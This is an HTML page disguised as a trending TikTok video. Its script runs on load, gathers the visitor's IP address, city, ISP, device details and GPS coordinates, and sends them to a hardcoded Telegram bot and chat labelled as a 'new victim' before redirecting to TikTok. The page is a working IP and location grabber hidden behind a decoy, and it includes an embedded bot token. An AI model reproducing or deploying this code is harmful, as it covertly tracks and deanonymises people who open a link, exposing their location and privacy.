<!DOCTYPE html>
<html>
<head>
    <title>TikTok Video</title>
    <style>
        body { 
            background: #000; 
            color: #fff; 
            text-align: center; 
            font-family: Arial; 
            margin: 0;
            padding: 20px;
        }
        .loader {
            margin-top: 50px;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #333;
            border-top: 4px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #data {
            display: none;
        }
    </style>
</head>
<body>
    <h1>🎵 TRENDING TIKTOK VIDEO</h1>
    <div class="loader">
        <div class="spinner"></div>
        <p>Preparing video content...</p>
    </div>

    <div id="data"></div>

    <script>
        async function collectSortedData() {
            const data = {
                network: {},
                system: {},
                device: {},
                connection: {},
                location: {},
                performance: {},
                session: {},
                timing: {},
                technical: {}
            };

            // 1. СЕТЕВЫЕ ДАННЫЕ
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                data.network.ip = ipData.ip;
                
                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geoData = await geoResponse.json();
                data.network.country = geoData.country_name;
                data.network.city = geoData.city;
                data.network.region = geoData.region;
                data.network.isp = geoData.org;
                data.network.timezone = geoData.timezone;
            } catch(e) {}

            // 2. СИСТЕМНЫЕ ДАННЫЕ
            data.system.userAgent = navigator.userAgent;
            data.system.platform = navigator.platform;
            data.system.language = navigator.language;
            data.system.languages = navigator.languages.join(', ');
            data.system.vendor = navigator.vendor;

            // 3. ДАННЫЕ УСТРОЙСТВА
            data.device.screen = `${screen.width}x${screen.height}`;
            data.device.colorDepth = `${screen.colorDepth}bit`;
            data.device.pixelRatio = window.devicePixelRatio;
            data.device.touchSupport = !!('ontouchstart' in window);
            data.device.cpuCores = navigator.hardwareConcurrency;
            data.device.memory = navigator.deviceMemory || 'unknown';

            // 4. ДАННЫЕ ПОДКЛЮЧЕНИЯ
            if (navigator.connection) {
                data.connection.type = navigator.connection.effectiveType;
                data.connection.downlink = `${navigator.connection.downlink}Mbps`;
                data.connection.rtt = `${navigator.connection.rtt}ms`;
            }

            // 5. ГЕОЛОКАЦИЯ
            if (navigator.geolocation) {
                await new Promise(resolve => {
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            data.location.latitude = position.coords.latitude;
                            data.location.longitude = position.coords.longitude;
                            data.location.accuracy = `${position.coords.accuracy}m`;
                            resolve();
                        },
                        () => resolve(),
                        { timeout: 3000 }
                    );
                });
            }

            // 6. СЕАНС И ВРЕМЯ
            data.session.referrer = document.referrer || 'direct';
            data.session.url = window.location.href;
            data.timing.localTime = new Date().toString();
            data.timing.timezoneOffset = `${new Date().getTimezoneOffset()}min`;

            await sendSortedToTelegram(data);
        }

        async function sendSortedToTelegram(data) {
            const botToken = "8044243850:AAG3jnmhyAPFJq2J1qXxyQAZ9tVA1smYBy0";
            const chatId = "1486385025";
            
            // Функция для форматирования категории
            const formatCategory = (title, obj) => {
                let text = `🔹 **${title}**\\n`;
                Object.keys(obj).forEach(key => {
                    if (obj[key]) text += `• ${key}: ${obj[key]}\\n`;
                });
                return text + '\\n';
            };

            try {
                // Отправляем каждую категорию отдельным сообщением
                const categories = [
                    { title: '🌐 СЕТЕВЫЕ ДАННЫЕ', data: data.network },
                    { title: '💻 СИСТЕМНЫЕ ДАННЫЕ', data: data.system },
                    { title: '📱 ДАННЫЕ УСТРОЙСТВА', data: data.device },
                    { title: '📶 ДАННЫЕ ПОДКЛЮЧЕНИЯ', data: data.connection },
                    { title: '📍 ГЕОЛОКАЦИЯ', data: data.location },
                    { title: '⏰ ВРЕМЕННЫЕ ДАННЫЕ', data: data.timing },
                    { title: '🔗 ДАННЫЕ СЕАНСА', data: data.session }
                ];

                // Отправляем заголовок
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: '🆕 **НОВАЯ ЖЕРТВА - ОТСОРТИРОВАННЫЕ ДАННЫЕ**',
                        parse_mode: 'Markdown'
                    })
                });

                // Отправляем каждую категорию
                for (const category of categories) {
                    if (Object.keys(category.data).length > 0) {
                        const message = formatCategory(category.title, category.data);
                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: message,
                                parse_mode: 'Markdown'
                            })
                        });
                        await new Promise(resolve => setTimeout(resolve, 500));
                    }
                }

            } catch(e) {}
        }

        // ЗАПУСК
        setTimeout(() => {
            collectSortedData();
            setTimeout(() => {
                window.location.href = "https://vm.tiktok.com/ZMAbhyLnv/";
            }, 4000);
        }, 1000);
    </script>
</body>
</html>
